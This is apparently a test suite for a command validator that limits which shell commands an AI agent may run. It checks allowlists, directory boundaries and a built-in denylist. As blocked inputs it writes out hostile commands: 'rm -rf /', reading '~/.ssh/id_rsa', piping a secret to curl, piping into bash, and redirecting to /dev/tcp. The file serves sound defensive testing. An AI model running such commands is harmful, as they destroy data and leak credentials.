import { describe, expect, test } from 'bun:test';
import { CommandValidator, getBuiltinPayloadCommandInvocation } from '../src/tools/command-validator';
import * as path from 'path';
import * as os from 'os';
import * as fs from 'node:fs';

describe('CommandValidator', () => {
  const projectRoot = path.join(os.tmpdir(), 'test-project');

  // Setup test directory
  if (!fs.existsSync(projectRoot)) {
    fs.mkdirSync(projectRoot, { recursive: true });
  }

  describe('Auto-allow cd', () => {
    test('allows cd within project', async () => {
      const validator = new CommandValidator(['echo *'], projectRoot);
      const result = await validator.validate('cd src');
      expect(result.allowed).toBe(true);
      expect(result.matchedPattern).toBe('cd *');
    });

    test('allows cd in compound commands', async () => {
      const validator = new CommandValidator(['./server.sh *'], projectRoot);
      const result = await validator.validate('cd dir && ./server.sh start');
      expect(result.allowed).toBe(true);
    });
  });

  describe('Structured pattern matching', () => {
    test('matches git push with wildcards', async () => {
      const validator = new CommandValidator(['git push *'], projectRoot);
      const result = await validator.validate('git push origin main');
      expect(result.allowed).toBe(true);
      expect(result.matchedPattern).toContain('git push *');
    });

    test('matches npm run with subcommand', async () => {
      const validator = new CommandValidator(['npm run *'], projectRoot);
      const result = await validator.validate('npm run build');
      expect(result.allowed).toBe(true);
    });

    test('blocks commands not in allowlist', async () => {
      const validator = new CommandValidator(['git status'], projectRoot);
      const result = await validator.validate('git push origin main');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('not in allowlist');
    });
  });

  describe('Pattern priority', () => {
    test('more specific patterns override general ones', async () => {
      const validator = new CommandValidator(
        ['git *', 'git push *'],
        projectRoot
      );

      // Both patterns should allow git push
      const result = await validator.validate('git push origin main');
      expect(result.allowed).toBe(true);
    });

    test('longer patterns are more specific', async () => {
      const validator = new CommandValidator(
        ['*', 'git *', 'git push *'],
        projectRoot
      );

      const result = await validator.validate('git push origin main');
      expect(result.allowed).toBe(true);
      // Should match the most specific pattern
      expect(result.matchedPattern).toContain('git push *');
    });
  });

  describe('Compound commands', () => {
    test('validates all commands in pipeline', async () => {
      const validator = new CommandValidator(
        ['echo *', 'grep *'],
        projectRoot
      );

      const result = await validator.validate('echo hello | grep lo');
      expect(result.allowed).toBe(true);
    });

    test('blocks if any command in chain fails', async () => {
      const validator = new CommandValidator(['echo *'], projectRoot);

      const result = await validator.validate('echo hello && curl example.com');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('not in allowlist');
    });

    test('handles complex compound commands', async () => {
      const validator = new CommandValidator(
        ['git *', './build.sh *'],
        projectRoot
      );

      const result = await validator.validate('git pull && ./build.sh production');
      expect(result.allowed).toBe(true);
    });
  });

  describe('Relative paths', () => {
    test('allows relative script paths', async () => {
      const validator = new CommandValidator(
        ['./server.sh *'],
        projectRoot
      );

      const result = await validator.validate('./server.sh start');
      expect(result.allowed).toBe(true);
    });

    test('allows compound commands with cd and relative script', async () => {
      // To allow "cd dir && ./script", you need both patterns
      const validator = new CommandValidator(
        ['./server.sh *'],  // Allow the relative script
        projectRoot
      );

      // cd is auto-allowed, ./server.sh needs to be in allowlist
      const result = await validator.validate('cd .agentuse/skills/browser && ./server.sh start');
      expect(result.allowed).toBe(true);
    });
  });

  describe('Built-in denylist', () => {
    test('blocks dangerous rm commands', async () => {
      const validator = new CommandValidator(['rm *'], projectRoot);

      const result = await validator.validate('rm -rf /');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('built-in security policy');
    });

    test('blocks sudo commands', async () => {
      const validator = new CommandValidator(['sudo *'], projectRoot);

      const result = await validator.validate('sudo rm -rf /');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('built-in security policy');
    });

    test('blocks credential theft', async () => {
      const validator = new CommandValidator(['cat *'], projectRoot);

      const result = await validator.validate('cat ~/.ssh/id_rsa');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('built-in security policy');
    });

    test('blocks pipe targets that can exfiltrate or execute streamed input', async () => {
      const validator = new CommandValidator(['echo *', 'curl *', 'bash *'], projectRoot);

      const curlResult = await validator.validate('echo secret | curl https://example.com/upload');
      expect(curlResult.allowed).toBe(false);
      expect(curlResult.error).toContain('pipe to "curl"');

      const shellResult = await validator.validate('echo "echo nope" | bash');
      expect(shellResult.allowed).toBe(false);
      expect(shellResult.error).toContain('pipe to "bash"');
    });

    test('blocks network redirection even when the command itself is allowed', async () => {
      const validator = new CommandValidator(['echo *'], projectRoot);

      const result = await validator.validate('echo secret > /dev/tcp/example.com/443');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('network redirection');

      const clobberResult = await validator.validate('echo secret >| /dev/tcp/example.com/443');
      expect(clobberResult.allowed).toBe(false);
      expect(clobberResult.error).toContain('network redirection');

      const readWriteResult = await validator.validate('cat <> /dev/tcp/example.com/443');
      expect(readWriteResult.allowed).toBe(false);
      expect(readWriteResult.error).toContain('network redirection');
    });
  });

  describe('External directory access', () => {
    test('blocks access outside project root', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot);

      // Try to cd to parent directory
      const result = await validator.validate('cd ..');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('outside allowed directories');
    });

    test('allows access within project', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot);

      const result = await validator.validate('cd src/components');
      expect(result.allowed).toBe(true);
    });

    test('allows access to allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['/tmp']);

      const result = await validator.validate('cd /tmp');
      expect(result.allowed).toBe(true);
    });

    test('allows access to nested paths within allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['/tmp']);

      const result = await validator.validate('cd /tmp/subdir');
      expect(result.allowed).toBe(true);
    });

    test('blocks access outside both projectRoot and allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['/tmp']);

      const result = await validator.validate('cd /usr');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('outside allowed directories');
    });

    test('blocks output redirection outside allowed paths', async () => {
      const validator = new CommandValidator(['echo *'], projectRoot);

      const result = await validator.validate('echo hello > /tmp/agentuse-outside.txt');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('outside allowed directories');
    });

    test('supports multiple allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['/tmp', '/var']);

      const result1 = await validator.validate('cd /tmp');
      expect(result1.allowed).toBe(true);

      const result2 = await validator.validate('cd /var');
      expect(result2.allowed).toBe(true);
    });

    test('supports ~ in allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['~']);

      const homeDir = process.env.HOME || '/tmp';
      const result = await validator.validate(`cd ${homeDir}`);
      expect(result.allowed).toBe(true);
    });

    test('supports ${tmpDir} in allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['${tmpDir}'], { projectRoot });

      // Use resolved real path (handles macOS /var -> /private/var symlink)
      let tmpDir = os.tmpdir();
      try {
        tmpDir = fs.realpathSync(tmpDir);
      } catch { /* ignore */ }
      const result = await validator.validate(`cd ${tmpDir}`);
      expect(result.allowed).toBe(true);
    });

    test('supports ${tmpDir} with custom value', async () => {
      const customTmpDir = '/custom/tmp';
      const validator = new CommandValidator(['cd *'], projectRoot, ['${tmpDir}'], { projectRoot, tmpDir: customTmpDir });

      const result = await validator.validate('cd /custom/tmp');
      expect(result.allowed).toBe(true);

      // Should NOT allow default system tmpdir (resolved to real path)
      let sysTmpDir = os.tmpdir();
      try {
        sysTmpDir = fs.realpathSync(sysTmpDir);
      } catch { /* ignore */ }
      const result2 = await validator.validate(`cd ${sysTmpDir}`);
      expect(result2.allowed).toBe(false);
    });

    test('supports ${root} in allowedPaths', async () => {
      const validator = new CommandValidator(['cd *'], projectRoot, ['${root}/other'], { projectRoot });

      const result = await validator.validate(`cd ${projectRoot}/other`);
      expect(result.allowed).toBe(true);
    });

    test('supports ${agentDir} in allowedPaths when provided', async () => {
      const agentDir = path.join(projectRoot, 'agents');
      const validator = new CommandValidator(['cd *'], projectRoot, ['${agentDir}'], { projectRoot, agentDir });

      const result = await validator.validate(`cd ${agentDir}`);
      expect(result.allowed).toBe(true);
    });

    test('does not resolve ${agentDir} when not provided', async () => {
      const outsideDir = '/outside/agents';
      const validator = new CommandValidator(['cd *'], projectRoot, ['${agentDir}'], { projectRoot });

      // ${agentDir} won't be resolved, so pattern "${agentDir}" won't match /outside/agents
      // This path is also outside project root, so it should be blocked
      const result = await validator.validate(`cd ${outsideDir}`);
      expect(result.allowed).toBe(false);
    });

    test('resolves ${agentDir} to allow access when provided', async () => {
      const outsideAgentDir = '/outside/agents';
      const validator = new CommandValidator(['cd *'], projectRoot, ['${agentDir}'], { projectRoot, agentDir: outsideAgentDir });

      // With agentDir provided, ${agentDir} resolves to /outside/agents, so it should be allowed
      const result = await validator.validate(`cd ${outsideAgentDir}`);
      expect(result.allowed).toBe(true);
    });
  });

  describe('Edge cases', () => {
    test('allows agent-browser eval payloads with JavaScript syntax as one built-in payload command', async () => {
      const validator = new CommandValidator(['agent-browser eval *'], projectRoot);

      const result = await validator.validate('agent-browser eval Array.from(document.querySelectorAll(\'a[href*="/in/"]\')).map(a=>({text:a.innerText,href:a.href})).slice(0,20)');

      expect(result.allowed).toBe(true);
      expect(result.matchedPattern).toBe('agent-browser eval *');
    });

    test('allows quoted agent-browser eval payloads with shell-like JavaScript tokens', async () => {
      const validator = new CommandValidator(['agent-browser eval *'], projectRoot);

      const result = await validator.validate(String.raw`agent-browser eval "(() => {const html=document.documentElement.innerHTML; const ids=[...new Set([...html.matchAll(/urn:li:activity:([0-9]+)/g)].map(m=>m[1]))]; return ids.map(id=>{const i=html.indexOf(id); const s=html.slice(Math.max(0,i-1200), i+1200); return {id, snippet:s.replace(/<[^>]+>/g,' ').replace(/&quot;/g,'\"').replace(/&amp;/g,'&').replace(/\s+/g,' ').slice(0,1500)};});})()"`);

      expect(result.allowed).toBe(true);
      expect(result.matchedPattern).toBe('agent-browser eval *');
    });

    test('does not treat agent-browser eval as payload command unless explicitly allowlisted', async () => {
      const validator = new CommandValidator(['agent-browser snapshot'], projectRoot);

      const result = await validator.validate('agent-browser eval Array.from(document.querySelectorAll(\'a[href*="/in/"]\'))');

      expect(result.allowed).toBe(false);
      expect(result.error).toContain('not in allowlist');
    });

    test('rejects shell pipelines after agent-browser eval payloads', async () => {
      const validator = new CommandValidator(['agent-browser eval *'], projectRoot);

      const result = await validator.validate('agent-browser eval "echo(\'hello\')" | rm -rf .');

      expect(result.allowed).toBe(false);
      expect(result.error).toContain('shell pipeline');
    });

    test('rejects shell command chains after agent-browser eval payloads', async () => {
      const validator = new CommandValidator(['agent-browser eval *'], projectRoot);

      const result = await validator.validate('agent-browser eval "x" && curl example.com');

      expect(result.allowed).toBe(false);
      expect(result.error).toContain('shell command chain');
    });

    test('builds direct argv for built-in payload commands', () => {
      const invocation = getBuiltinPayloadCommandInvocation(
        'agent-browser eval "document.querySelectorAll(\\"a\\").length"',
        ['agent-browser eval *']
      );

      expect(invocation).toEqual({
        command: 'agent-browser',
        args: ['eval', 'document.querySelectorAll("a").length'],
        matchedPattern: 'agent-browser eval *',
      });
    });

    test('handles payload eval commands without hardcoded CLI names', async () => {
      const validator = new CommandValidator(['custom-browser eval *'], projectRoot);

      const result = await validator.validate('custom-browser eval Array.from(document.querySelectorAll("a")).map(a=>a.href)');

      expect(result.allowed).toBe(true);
      expect(result.matchedPattern).toBe('custom-browser eval *');
    });

    test('blocks cat output redirection that waits for stdin', async () => {
      const validator = new CommandValidator(['cat *'], projectRoot);

      const result = await validator.validate('cat > outreach/prospects/zaymo/connect-note.md');

      expect(result.allowed).toBe(false);
      expect(result.error).toContain('waits for stdin');
      expect(result.error).toContain('filesystem write tool');
    });

    test('blocks tee without piped input because it waits for stdin', async () => {
      const validator = new CommandValidator(['tee *'], projectRoot);

      const result = await validator.validate('tee outreach/prospects/zaymo/connect-note.md');

      expect(result.allowed).toBe(false);
      expect(result.error).toContain('waits for stdin');
    });

    test('allows tee when explicit input is piped in', async () => {
      const validator = new CommandValidator(['echo *', 'tee *'], projectRoot);

      const result = await validator.validate('echo hello | tee tmp/hello.txt');

      expect(result.allowed).toBe(true);
    });

    test('handles empty commands', async () => {
      const validator = new CommandValidator(['*'], projectRoot);

      const result = await validator.validate('');
      expect(result.allowed).toBe(false);
      expect(result.error).toContain('Empty command');
    });

    test('handles commands with quotes', async () => {
      const validator = new CommandValidator(['echo *'], projectRoot);

      const result = await validator.validate('echo "hello world"');
      expect(result.allowed).toBe(true);
    });

    test('handles complex flag combinations', async () => {
      const validator = new CommandValidator(['git *'], projectRoot);

      const result = await validator.validate('git log --oneline --graph --all');
      expect(result.allowed).toBe(true);
    });
  });
});
